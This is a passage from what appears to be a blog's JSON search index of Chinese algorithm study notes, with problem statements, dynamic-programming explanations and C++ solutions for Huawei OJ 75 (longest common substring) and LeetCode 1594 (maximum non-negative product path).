list[i][j]\u8868\u793a\u4ee5str1[i]\u548cstr2[j]\u7ed3\u5c3e\u7684\u6700\u957f\u516c\u5171\u5b50\u4e32 list[i][j] = list[i - 1][j - 1] + 1; maxAns = max(maxAns, list[i][j]); }else{ list[i][j] = 0; } } } cout<<maxAns<<endl; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://blog.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"7.\u534e\u4e3aOJ 75 \u516c\u5171\u5b50\u4e32\u8ba1\u7b97"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/#oj-75","text":"","title":"\u534e\u4e3aOJ 75 \u516c\u5171\u5b50\u4e32\u8ba1\u7b97"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/#_1","text":"\u534e\u4e3aOJ 75 \u516c\u5171\u5b50\u4e32\u8ba1\u7b97 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/#12-problem-description","text":"\u8ba1\u7b97\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u6700\u5927\u516c\u5171\u5b57\u4e32\u7684\u957f\u5ea6\uff0c\u5b57\u7b26\u4e0d\u533a\u5206\u5927\u5c0f\u5199","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/#13-input","text":"\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/#14-output","text":"\u8f93\u51fa\u4e00\u4e2a\u6574\u6570","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/#15-sample-input","text":"asdfas werasdfaswer","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/#16-sample-output","text":"6","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/#18-source","text":"\u534e\u4e3aOJ 75 \u516c\u5171\u5b50\u4e32\u8ba1\u7b97","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/#2","text":"\u52a8\u6001\u89c4\u5212\u3002 list[i][j] \u8868\u793a\u4ee5 str1[i-1]\u548cstr2[j-1] \u7ed3\u5c3e\u7684\u6700\u957f\u516c\u5171\u5b50\u4e32\uff0c \u9012\u63a8\u65b9\u7a0b\u5982\u4e0b\u3002 list[i][j] ={\\left\\{ \\begin{aligned} & list[i - 1][j - 1] + 1 & , (str1[i] = str2[j]) \\\\ & 0 & , (str1[i] \\neq str2[j]) \\\\ \\end{aligned}\\right. }","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/#3","text":"#include<iostream> using namespace std; const int MAXM = 1e3 + 1; int main(){ string str1, str2; cin>>str1>>str2; int list[MAXM][MAXM] = {{0}}; int maxAns = 0; for(int i = 1; i <= str1.size(); i++){ for(int j = 1; j <= str2.size(); j++){ if(toupper(str1[i-1])==toupper(str2[j-1])){ // list[i][j]\u8868\u793a\u4ee5str1[i]\u548cstr2[j]\u7ed3\u5c3e\u7684\u6700\u957f\u516c\u5171\u5b50\u4e32 list[i][j] = list[i - 1][j - 1] + 1; maxAns = max(maxAns, list[i][j]); }else{ list[i][j] = 0; } } } cout<<maxAns<<endl; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://blog.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/","text":"LeetCode 1594 \u77e9\u9635\u7684\u6700\u5927\u975e\u8d1f\u79ef # \u76ee\u5f55 # LeetCode 1594 \u77e9\u9635\u7684\u6700\u5927\u975e\u8d1f\u79ef \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u4f60\u4e00\u4e2a\u5927\u5c0f\u4e3a rows x cols \u7684\u77e9\u9635 grid \u3002\u6700\u521d\uff0c\u4f60\u4f4d\u4e8e\u5de6\u4e0a\u89d2 (0, 0) \uff0c\u6bcf\u4e00\u6b65\uff0c\u4f60\u53ef\u4ee5\u5728\u77e9\u9635\u4e2d \u5411\u53f3 \u6216 \u5411\u4e0b \u79fb\u52a8\u3002 \u5728\u4ece\u5de6\u4e0a\u89d2 (0, 0) \u5f00\u59cb\u5230\u53f3\u4e0b\u89d2 (rows - 1, cols - 1) \u7ed3\u675f\u7684\u6240\u6709\u8def\u5f84\u4e2d\uff0c\u627e\u51fa\u5177\u6709 \u6700\u5927\u975e\u8d1f\u79ef \u7684\u8def\u5f84\u3002\u8def\u5f84\u7684\u79ef\u662f\u6cbf\u8def\u5f84\u8bbf\u95ee\u7684\u5355\u5143\u683c\u4e2d\u6240\u6709\u6574\u6570\u7684\u4e58\u79ef\u3002 \u8fd4\u56de \u6700\u5927\u975e\u8d1f\u79ef \u5bf9 1e9 + 7 \u53d6\u4f59 \u7684\u7ed3\u679c\u3002\u5982\u679c\u6700\u5927\u79ef\u4e3a\u8d1f\u6570\uff0c\u5219\u8fd4\u56de -1 \u3002 \u6ce8\u610f\uff0c\u53d6\u4f59\u662f\u5728\u5f97\u5230\u6700\u5927\u79ef\u4e4b\u540e\u6267\u884c\u7684\u3002 1 <= rows, cols <= 15 -4 <= grid[i][j] <= 4 1.3. Sample Input 1 # \u8f93\u5165\uff1agrid = [[-1,-2,-3], [-2,-3,-3], [-3,-3,-2]] 1.4. Sample Output 1 # \u8f93\u51fa\uff1a-1 \u89e3\u91ca\uff1a\u4ece (0, 0) \u5230 (2, 2) \u7684\u8def\u5f84\u4e2d\u65e0\u6cd5\u5f97\u5230\u975e\u8d1f\u79ef\uff0c\u6240\u4ee5\u8fd4\u56de -1 1.5. Sample Input 2 # \u8f93\u5165\uff1agrid = [[1,-2,1], [1,-2,1], [3,-4,1]] 1.6. Sample Output 2 # \u8f93\u51fa\uff1a8 \u89e3\u91ca\uff1a\u6700\u5927\u975e\u8d1f\u79ef\u5bf9\u5e94\u7684\u8def\u5f84\u5df2\u7ecf\u7528\u7c97\u4f53\u6807\u51fa (1 * 1 * -2 * -4 * 1 = 8) 1.7. Source # LeetCode 1594 \u77e9\u9635\u7684\u6700\u5927\u975e\u8d1f\u79ef 2. \u89e3\u8bfb # \u628a\u8fd9\u9053\u9898\u8f6c\u5316\u4e3a\u6811\u5f62\u7684\u95ee\u9898\u6765\u7406\u89e3\u4f1a\u66f4\u597d\u7406\u89e3\uff0c\u628a\u6bcf\u6761\u8def\u5f84\u770b\u4f5c\u6811\u4e0a\u4ece\u8d77\u70b9\u5230\u7ec8\u70b9\u7684\u8def\u5f84\u3002\u5982\u56fe\u6240\u793a\u3002 \u56e0\u4e3a\u5728\u77e9\u9635\u4e2d\u6211\u4eec\u53ea\u80fd\u5411\u53f3\u6216\u5411\u5de6\u79fb\u52a8\uff0c\u6240\u4ee5\u56fe\u4e2d\u7684\u84dd\u8272\u70b9\u53ea\u6709\u4e00\u4e2a\u5165\u53e3\uff0c\u4ece\u8d77\u70b9\u5230\u84dd\u8272\u70b9\u7684\u8def\u5f84\u6700\u5927\u503c\u5728\u6700\u521d\u5c31\u80fd\u591f\u88ab\u786e\u5b9a\u3002 \u800c\u84dd\u8272\u90e8\u5206\u7684\u503c\u88ab\u786e\u5b9a\u4ee5\u540e\uff0c\u7ea2\u8272\u70b9\u7684\u8def\u5f84\u6700\u5927\u503c\u4e5f\u80fd\u591f\u88ab\u786e\u5b9a\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u6700\u7ec8\u63a8\u5230\u7ec8\u70b9\u3002 \u56e0\u4e3a\u77e9\u9635\u4e2d\u7684\u503c\u53ef\u80fd\u4e3a\u8d1f\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4fdd\u5b58\u8def\u5f84\u5230\u8be5\u70b9\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u3002 \u9012\u63a8\u65b9\u7a0b\u4e3a maxBuffer = grid[i][j] * max(dpMax[i - 1][j], dpMax[i][j - 1]); minBuffer = grid[i][j] * min(dpMin[i - 1][j], dpMin[i][j - 1]); dpMax[i][j] = max(maxBuffer, minBuffer); dpMin[i][j] = min(maxBuffer, minBuffer); \u9996\u5148\u521d\u59cb\u5316\u7b2c\u4e00\u884c\u548c\u7b2c\u4e00\u5217\uff0c\u7136\u540e\u6309\u7167\u9012\u63a8\u5173\u7cfb\u6309\u884c\u987a\u5e8f\u6216\u5217\u987a\u5e8f\u4f9d\u6b21\u9012\u63a8\uff0c\u63a8\u5230\u7ec8\u70b9\u5373\u53ef\u3002 3. \u4ee3\u7801 # class Solution { public: const int MOD = 1e9 + 7; long long maxBuffer, minBuffer; int maxProductPath(vector<vector<int>>& grid) { const int MAXN = 15 + 1; long long dpMax[MAXN][MAXN] = { { 0 } }; long long dpMin[MAXN][MAXN] = { { 0 } }; // \u521d\u59cb\u5316\u8d77\u70b9 dpMax[0][0] = dpMin[0][0] = grid[0][0]; // \u521d\u59cb\u5316\u5217 for (size_t i = 1; i < grid.size(); i++) { dpMax[i][0] = dpMin[i][0] = grid[i][0] * dpMin[i - 1][0]; } // \u521d\u59cb\u5316\u884c for (size_t i = 1; i < grid[0].size(); i++) { dpMax[0][i] = dpMin[0][i] = grid[0][i] * dpMin[0][i - 1]; } // DP for (size_t i = 1; i < grid.size(); i++) { for (size_t j = 1; j < grid[0].size(); j++) { // \u5b58\u50a8\u6700\u5927\u6700\u5c0f\u503c\u548c\u5f53\u524d\u65b9\u5757\u503c\u7684\u79ef\uff0c\u56e0\u4e3a\u8d1f\u53f7\u7684\u5b58\u5728\uff0c\u5927\u5c0f\u53ef\u80fd\u7ffb\u8f6c maxBuffer = grid[i][j] * max(dpMax[i - 1][j], dpMax[i][j - 1]); minBuffer = grid[i][j] * min(dpMin[i - 1][j], dpMin[i][j - 1]); // \u518d\u5224\u65ad\u4e00\u6b21\u5927\u5c0f dpMax[i][j] = max(maxBuffer, minBuffer); dpMin[i][j] = min(maxBuffer, minBuffer); } } long long ans = dpMax[grid.size() - 1][grid[0].size() - 1] % MOD; return ans >= 0 ? ans : -1; } }; \u7528 DFS + \u526a\u679d \u8fd9\u9898\u4e5f\u80fd\u901a\u8fc7\uff0c\u4e0d\u8fc7\u65f6\u95f4\u5df2\u7ecf\u5230 1900ms \u4e86\uff0c\u5982\u679c\u6709\u66f4\u590d\u6742\u4e00\u4e9b\u7684\u6d4b\u8bd5\u7528\u4f8b\u4f30\u8ba1\u5c31\u8d85\u65f6\u4e86\u3002 class Solution { public: const int mod = 1e9 + 7; long long ans = -1; void DFS(vector<vector<int>>& grid, size_t x, size_t y, long long buffer) { // \u4e58\u79ef buffer *= grid[x][y]; // \u505c\u6b62\u641c\u7d22\u6761\u4ef6 if (y == grid[0].size() - 1 && x == grid.size() - 1) { ans = max(ans, buffer); // \u4e0d\u80fd\u4f7f\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u5728\u8fd9\u91cc\u53d6\u6a21\uff0c\u56e0\u4e3a\u4f1a\u5c06ans\u7684\u5927\u5c0f\u524a\u51cf\uff0c\u4ece\u800c\u4f7f\u539f\u672c\u66f4\u5c0f\u7684buffer\u66f4\u65b0ans // ans = max(ans, buffer) % mod; return; } // \u7ee7\u7eed\u641c\u7d22\u6761\u4ef6 if (buffer == 0) { ans = max(ans, 0LL); } else { // \u5411\u884c\u65b9\u5411\u6269\u5c55 if (x < grid.size() - 1) { DFS(grid, x + 1, y, buffer); } // \u5411\u5217\u65b9\u5411\u6269\u5c55 if (y < grid[0].size() - 1) { DFS(grid, x, y + 1, buffer); } } } int maxProductPath(vector<vector<int>>& grid) { DFS(grid, 0, 0, 1); ans %= mod; return ans >= 0 ? ans : -1; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"8.LeetCode 1594 \u77e9\u9635\u7684\u6700\u5927\u975e\u8d1f\u79ef"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/#leetcode-1594","text":"","title":"LeetCode 1594 \u77e9\u9635\u7684\u6700\u5927\u975e\u8d1f\u79ef"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/#_1","text":"LeetCode 1594 \u77e9\u9635\u7684\u6700\u5927\u975e\u8d1f\u79ef \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/#11-limit","text":"Time Limit: 2000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/#12-problem-description","text":"\u7ed9\u4f60\u4e00\u4e2a\u5927\u5c0f\u4e3a rows x cols \u7684\u77e9\u9635 grid \u3002\u6700\u521d\uff0c\u4f60\u4f4d\u4e8e\u5de6\u4e0a\u89d2 (0, 0) \uff0c\u6bcf\u4e00\u6b65\uff0c\u4f60\u53ef\u4ee5\u5728\u77e9\u9635\u4e2d \u5411\u53f3 \u6216 \u5411\u4e0b \u79fb\u52a8\u3002 \u5728\u4ece\u5de6\u4e0a\u89d2 (0, 0) \u5f00\u59cb\u5230\u53f3\u4e0b\u89d2 (rows - 1, cols - 1) \u7ed3\u675f\u7684\u6240\u6709\u8def\u5f84\u4e2d\uff0c\u627e\u51fa\u5177\u6709 \u6700\u5927\u975e\u8d1f\u79ef \u7684\u8def\u5f84\u3002\u8def\u5f84\u7684\u79ef\u662f\u6cbf\u8def\u5f84\u8bbf\u95ee\u7684\u5355\u5143\u683c\u4e2d\u6240\u6709\u6574\u6570\u7684\u4e58\u79ef\u3002 \u8fd4\u56de \u6700\u5927\u975e\u8d1f\u79ef \u5bf9 1e9 + 7 \u53d6\u4f59 \u7684\u7ed3\u679c\u3002\u5982\u679c\u6700\u5927\u79ef\u4e3a\u8d1f\u6570\uff0c\u5219\u8fd4\u56de -1 \u3002 \u6ce8\u610f\uff0c\u53d6\u4f59\u662f\u5728\u5f97\u5230\u6700\u5927\u79ef\u4e4b\u540e\u6267\u884c\u7684\u3002 1 <= rows, cols <= 15 -4 <= grid[i][j] <= 4","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/#13-sample-input-1","text":"\u8f93\u5165\uff1agrid = [[-1,-2,-3], [-2,-3,-3], [-3,-3,-2]]","title":"1.3. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/#14-sample-output-1","text":"\u8f93\u51fa\uff1a-1 \u89e3\u91ca\uff1a\u4ece (0, 0) \u5230 (2, 2) \u7684\u8def\u5f84\u4e2d\u65e0\u6cd5\u5f97\u5230\u975e\u8d1f\u79ef\uff0c\u6240\u4ee5\u8fd4\u56de -1","title":"1.4. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/#15-sample-input-2","text":"\u8f93\u5165\uff1agrid = [[1,-2,1], [1,-2,1], [3,-4,1]]","title":"1.5. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/#16-sample-output-2","text":"\u8f93\u51fa\uff1a8 \u89e3\u91ca\uff1a\u6700\u5927\u975e\u8d1f\u79ef\u5bf9\u5e94\u7684\u8def\u5f84\u5df2\u7ecf\u7528\u7c97\u4f53\u6807\u51fa (1 * 1 * -2 * -4 * 1 = 8)","title":"1.6. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/#17-source","text":"LeetCode 1594 \u77e9\u9635\u7684\u6700\u5927\u975e\u8d1f\u79ef","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/#2","text":"\u628a\u8fd9\u9053\u9898\u8f6c\u5316\u4e3a\u6811\u5f62\u7684\u95ee\u9898\u6765\u7406\u89e3\u4f1a\u66f4\u597d\u7406\u89e3\uff0c\u628a\u6bcf\u6761\u8def\u5f84\u770b\u4f5c\u6811\u4e0a\u4ece\u8d77\u70b9\u5230\u7ec8\u70b9\u7684\u8def\u5f84\u3002\u5982\u56fe\u6240\u793a\u3002 \u56e0\u4e3a\u5728\u77e9\u9635\u4e2d\u6211\u4eec\u53ea\u80fd\u5411\u53f3\u6216\u5411\u5de6\u79fb\u52a8\uff0c\u6240\u4ee5\u56fe\u4e2d\u7684\u84dd\u8272\u70b9\u53ea\u6709\u4e00\u4e2a\u5165\u53e3\uff0c\u4ece\u8d77\u70b9\u5230\u84dd\u8272\u70b9\u7684\u8def\u5f84\u6700\u5927\u503c\u5728\u6700\u521d\u5c31\u80fd\u591f\u88ab\u786e\u5b9a\u3002 \u800c\u84dd\u8272\u90e8\u5206\u7684\u503c\u88ab\u786e\u5b9a\u4ee5\u540e\uff0c\u7ea2\u8272\u70b9\u7684\u8def\u5f84\u6700\u5927\u503c\u4e5f\u80fd\u591f\u88ab\u786e\u5b9a\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u6700\u7ec8\u63a8\u5230\u7ec8\u70b9\u3002 \u56e0\u4e3a\u77e9\u9635\u4e2d\u7684\u503c\u53ef\u80fd\u4e3a\u8d1f\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4fdd\u5b58\u8def\u5f84\u5230\u8be5\u70b9\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u3002 \u9012\u63a8\u65b9\u7a0b\u4e3a maxBuffer = grid[i][j] * max(dpMax[i - 1][j], dpMax[i][j - 1]); minBuffer = grid[i][j] * min(dpMin[i - 1][j], dpMin[i][j - 1]); dpMax[i][j] = max(maxBuffer, minBuffer); dpMin[i][j] = min(maxBuffer, minBuffer); \u9996\u5148\u521d\u59cb\u5316\u7b2c\u4e00\u884c\u548c\u7b2c\u4e00\u5217\uff0c\u7136\u540e\u6309\u7167\u9012\u63a8\u5173\u7cfb\u6309\u884c\u987a\u5e8f\u6216\u5217\u987a\u5e8f\u4f9d\u6b21\u9012\u63a8\uff0c\u63a8\u5230\u7ec8\u70b9\u5373\u53ef\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/8.LeetCode_1594_%E7%9F%A9%E9%98%B5%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%9E%E8%B4%9F%E7%A7%AF/#3","text":"class Solution { public: const int MOD = 1e9 + 7; long long maxBuffer, minBuffer; int maxProductPath(vector<vector<int>>& grid) { const int MAXN = 15 + 1; long long dpMax[MAXN][MAXN] = { { 0 } }; long long dpMin[MAXN][MAXN] = { { 0 } }; // \u521d\u59cb\u5316\u8d77\u70b9 dpMax[0][0] = dpMin[0][0] = grid[0][0]; // \u521d\u59cb\u5316\u5217 for (size_t i = 1; i < grid.size(); i++) { dpMax[i][0] = dpMin[i][0] = grid[i][0] * dpMin[i - 1][0]; } // \u521d\u59cb\u5316\u884c for (size_t i = 1; i < grid[0].size(); i++) { dpMax[0][i] = dpMin[0][i] = grid[0][i] * dpMin[0][i - 1]; } // DP for (size_t i = 1; i < grid.size(); i++) { for (size_t j = 1; j < grid[0].size(); j++) { // 